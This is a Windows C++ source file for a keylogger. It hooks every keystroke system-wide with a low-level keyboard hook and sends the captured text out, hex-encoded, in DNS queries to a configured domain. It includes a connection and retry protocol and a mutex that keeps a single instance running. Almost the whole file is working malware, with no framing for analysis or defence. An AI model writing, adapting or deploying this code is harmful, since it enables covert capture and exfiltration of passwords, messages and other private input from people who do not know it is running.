#include <iostream>
#include <string>
#include <sstream>
// WinAPI
#include <iomanip>
#include <windows.h>
#include <windns.h>
#include <winsock.h>

#define MAX_BUFFER 5
#define MUTEX_NAME "1fc325f3-c548-43db-a13f-8c460dda8381"

const DWORD DNS_OPTIONS = DNS_QUERY_BYPASS_CACHE + DNS_QUERY_ACCEPT_TRUNCATED_RESPONSE;
HHOOK _k_hook;
HKL keyboardLayout;
std::string keystrokeBuffer = "";

int connectionId = -1;
int packetNumber = 0;

/**
 * nCode: should be 0, indicating that wParam and lParam have information about
 *     the keystroke
 * wParam: key code generated by keystroke message
 * lParam: information about the keystroke
 */
LRESULT __stdcall processKey(int nCode, WPARAM wParam, LPARAM lParam);

/**
 * Establishes connection with server
 * domain: cstring containing domain (eg. example.com)
 * returns: connection id, or -1 if failed.
 */
int startConnection(const char* domain);

/**
 * Send data to server
 * id: a reference to an integer containing the connection id.
 * packet number: a reference to an integer containing the current packet number
 * domain: cstring containing domain (eg. example.com)
 * returns: -1 if failed, 0 otherwise
 */
int sendData(int& id, int& packetNumber, const char* domain, const char* data);

/**
 * Converts a cstring to a std::string containing the hex encoded characters of the cstring.
 * string: cstring to be converted.
 * returns: the string of hex characters, or an empty string if failed.
 */
std::string convertToHex(const char* string);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
    LPSTR lpCmdLine, int nCmdShow) {
	HANDLE mutex = CreateMutex(0, 0, MUTEX_NAME);  // used to check if the program has already started
	switch (GetLastError()) {
		case ERROR_ALREADY_EXISTS:  // program already running
			return TRUE;
		case ERROR_SUCCESS:  // program isn't already running
		default:  // start just to be sure.
			break;
	}
	
	// establish connection
	while ((connectionId = startConnection(DOMAIN)) == -1) {
		Sleep(1000);  // sleep to prevent spamming
		std::cout << "Failed to establish connection" << std::endl;
	}
	std::cout << "Connection ID: " << connectionId << std::endl;
	
	// global keyboard hook that calls processKey
	_k_hook = SetWindowsHookEx(WH_KEYBOARD_LL, processKey, NULL, 0);
	keyboardLayout = GetKeyboardLayout(0);
	
	MSG msg;
	// message loop
	while (GetMessage(&msg, NULL, 0, 0) > 0) {
		// pass the key along, allowing to to be used by other processes
		TranslateMessage(&msg);
		DispatchMessageW(&msg);	
	}
	
	// end of program, if hook successful, unhook
	if (_k_hook) {
		UnhookWindowsHookEx(_k_hook);
	}
	
	return msg.wParam;
}

LRESULT __stdcall processKey(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0) {  // do not process key if < 0, as specified by documentation
		PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;  
		if (wParam == WM_KEYDOWN && nCode == HC_ACTION) {
			GetKeyState(VK_SHIFT);  // needed to update keyboard state
			BYTE keyboardState[256];
			GetKeyboardState(keyboardState);
			
			unsigned short translatedChar[2];
			
			if (ToAsciiEx(key->vkCode, key->scanCode, keyboardState, translatedChar, key->flags, keyboardLayout) == 1) {  // if only one key in buffer
				char key = (char)translatedChar[0];
				keystrokeBuffer += key;
				if (keystrokeBuffer.size() >= MAX_BUFFER) {
					std::cout << keystrokeBuffer << std::endl;
					int success = sendData(connectionId, packetNumber, DOMAIN, keystrokeBuffer.c_str());
					keystrokeBuffer = "";
					std::cout << success << std::endl << std::endl;
					packetNumber++;
					if (packetNumber > 999) {
						packetNumber = 0;
					}
				}
			}
		}
	}
	
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int startConnection(const char* domain) {
	std::string fullString = "a.1.1.1.";
	fullString += domain;
	const char* pOwnerName = fullString.c_str();
	WORD wType = DNS_TYPE_A;
	PDNS_RECORD pDnsRecord;
	DNS_STATUS status = DnsQuery_A(pOwnerName,
								   wType,
								   DNS_OPTIONS,
								   NULL,
								   &pDnsRecord,
								   NULL);  // sends two requests for some reason?
	if (status) {
		return -1;
	} else {
		IN_ADDR ipaddr;
		ipaddr.S_un.S_addr = (pDnsRecord->Data.A.IpAddress);
		std::string ipStr = inet_ntoa(ipaddr);
		DnsRecordListFree(pDnsRecord, DNS_FREE_TYPE::DnsFreeRecordList);
		return std::stoi(ipStr.substr(ipStr.rfind(".") + 1));
	}
}

int sendData(int& id, int& packetNumber, const char* domain, const char* data) {
	std::ostringstream fullStream;
	fullStream << "b." << packetNumber << "." << id << "." << convertToHex(data) << "." << domain;
	std::string full = fullStream.str();
	const char* pOwnerName = full.c_str();
	std::cout << pOwnerName << std::endl;
	WORD wType = DNS_TYPE_A;
	PDNS_RECORD pDnsRecord;
	
	DNS_STATUS status = DnsQuery_A(pOwnerName,
								   wType,
								   DNS_OPTIONS,
								   NULL,
								   &pDnsRecord,
								   NULL);
	
	// retry 5 times, then give up this message
	for (int i = 0; i < 5; i++) {
		if (!status) {
			IN_ADDR ipaddr;
			ipaddr.S_un.S_addr = (pDnsRecord->Data.A.IpAddress);
			std::string ipStr = inet_ntoa(ipaddr);
			DnsRecordListFree(pDnsRecord, DNS_FREE_TYPE::DnsFreeRecordList);
			
			int code = std::stoi(ipStr.substr(0, ipStr.find(".")));
			std::cout << "Response Code: " << code << std::endl;
			switch (code) {
				case 200:  // processed normally
					return 0;
				case 201:  // malformed
					break;
				case 202:  // connection non-existant
					{
						int new_id = startConnection(DOMAIN);
						if (new_id != -1) {
							id = new_id;
						}
					}
					i--;
					break;
				case 203:  // out of order packets
					packetNumber = 0;
					i--;
					break;
				case 204:  // max connections
				default:  // unknown error
					return -1;
			}
		}
		status = DnsQuery_A(pOwnerName,
								   wType,
								   DNS_OPTIONS,
								   NULL,
								   &pDnsRecord,
								   NULL);
	}
	
	return -1;
}

std::string convertToHex(const char* string) {
	std::ostringstream out;
	out << std::hex << std::setfill('0') << std::setw(2);
	for (const char* i = string; *i; i++) {
		out << std::setw(2) << static_cast<unsigned>(*i);
	}
	return out.str();
}